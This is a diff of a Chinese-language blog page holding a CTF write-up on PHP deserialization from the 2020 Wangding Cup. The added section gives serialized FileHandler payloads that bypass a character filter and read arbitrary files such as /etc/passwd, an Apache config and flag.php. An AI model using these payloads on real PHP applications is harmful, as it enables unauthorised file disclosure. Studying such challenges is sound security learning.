@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">942</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.5k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -413,18 +413,38 @@ height:50vh;
 <p>直接将上述字符传入str并不能读取成功，这是因为序列化字符串当中protected属性的影响，三种属性对应的序列化字符串格式如下</p>
 <figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">private:数据类型:属性名长度:<span class="string">"\00类名\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">protected:数据类型:属性名长度:<span class="string">"\00*\00属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div><div class="line">public:数据类型:属性名长度:<span class="string">"属性名"</span>;数据类型:属性值长度:<span class="string">"属性值"</span>;</div></pre></td></tr></table></figure>
 <p>所以这里的payload实际上为：<code>O:11:&quot;FileHandler&quot;:2:{s:5:&quot;00*00op&quot;;i:2;s:11:&quot;00*00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p>
-<p>因为存在protected属性，导致序列化字符串当中存在字符00，而在对字符串进行反序列化之前，这里的<code>is_valid</code>函数对字符串当中的字符进行了检查，要求其字符必须为可显示字符(ascii码值32-125)，所以这里要将payload改为:<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code>，将s改为S</p>
+<p>因为存在protected属性，导致序列化字符串当中存在字符00，而在对字符串进行反序列化之前，这里的<code>is_valid</code>函数对字符串当中的字符进行了检查，要求其字符必须为可显示字符(ascii码值32-125)，所以这里要将payload改为:<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code>，将s改为S，之后将payload进行url编码后传入</p>
 <p><code>\00</code>三个字符均符合<code>!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)</code>，所以这里读取成功<br><img src="http://pic.c1imber.top/blog/20200510/71LKiCfOBTXL.png?imageslim" alt="mark"></p>
 <p>然后就可以通过任意文件读取获得flag了</p>
+<p>5月11日补充：</p>
+<p>题目环境buuoj上已经有了，今天看了颖奇L’Amore师傅的博客，对于这道题在需要这里补充几点</p>
+<p>文章链接：<a href="https://www.gem-love.com/websecurity/2322.html?from=timeline&amp;isappinstalled=0" title="第二届“网鼎杯”青龙组WEB部分题目Writeup" target="_blank" rel="external">第二届“网鼎杯”青龙组WEB部分题目Writeup</a></p>
+<p>文章里提到php7.1+版本对属性类型不敏感，所以在构造poc时直接将对象属性类型设为public也能绕过<code>is_valid</code>的检查，导致非预期解</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> $op=<span class="number">2</span>;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">"/etc/passwd"</span>;</div><div class="line">&#125;</div><div class="line">$a=<span class="keyword">new</span> FileHandler();</div><div class="line"><span class="keyword">echo</span> serialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:11:&quot;/etc/passwd&quot;;}</code></p>
+<p>url编码后传入</p>
+<p><img src="http://pic.c1imber.top/blog/20200511/Dr6rhw6oKEEs.png?imageslim" alt="mark"></p>
+<p>另外需要注意的是，这里如果使用相对路径的话会失败，原因在文章里也说了，在执行完序列化字符串后，如果没有出现异常就会穿越到根目录，导致读取不到flag.php，在本地环境<code>var_dump(scandir(&quot;.&quot;))</code>和输出<code>$res</code>可以看到反序列化后跳到了根目录，获取<code>/flag.php</code>为<code>false</code></p>
+<p>payload：<code>O:11:&quot;FileHandler&quot;:2:{S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:8:&quot;flag.php&quot;;}</code></p>
+<p><img src="http://pic.c1imber.top/blog/20200511/kVLhM0tKsVHn.png?imageslim" alt="mark"></p>
+<p>所以这道题的解法实际如下：</p>
+<p>使用绝对路径，需要获取网站根目录，可以从apache配置文件当中获取跟目录，默认配置下，可以从<code>/etc/apache2/sites-available/000-default.conf</code>当中获取网站根目录</p>
+<p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:45:&quot;/etc/apache2/sites-available/000-default.conf&quot;;}</code></p>
+<p><img src="http://pic.c1imber.top/blog/20200511/XSHqAV3BijwP.png?imageslim" alt="mark"></p>
+<p>可以看到buuoj上这道题的环境没有修改根目录,所以直接读取<code>/var/www/html/flag.php</code>即可</p>
+<p>payload:<code>O:11:&quot;FileHandler&quot;:2:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;}</code></p>
+<p><img src="http://pic.c1imber.top/blog/20200511/7CAAH2Oy1nvE.png?imageslim" alt="mark"></p>
+<p>而在比赛环境当中是修改了网站的根目录的，而且apache网站配置文件也不是上面说的那个，需要通过<code>/proc/self/cmdline</code>才能获取到网站的根目录</p>
+<p>buuoj的题目环境通过相对路径就能读取到flag.php，有点奇怪，，，，</p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
-            <p>原文作者：<a href="https://c1aysec.github.io">c1ay</a>
+            <p>Author：<a href="https://c1aysec.github.io">c1ay</a>
             <p>原文链接：<a href="https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/">https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/</a>
             <p>发表日期：<a href="https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/">May 10th 2020, 4:51:05 pm</a>
-            <p>更新日期：<a href="https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/">May 10th 2020, 6:12:44 pm</a>
+            <p>更新日期：<a href="https://c1aysec.github.io/2020/05/10/2020网鼎杯青龙组-php反序列化/">May 11th 2020, 12:51:04 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
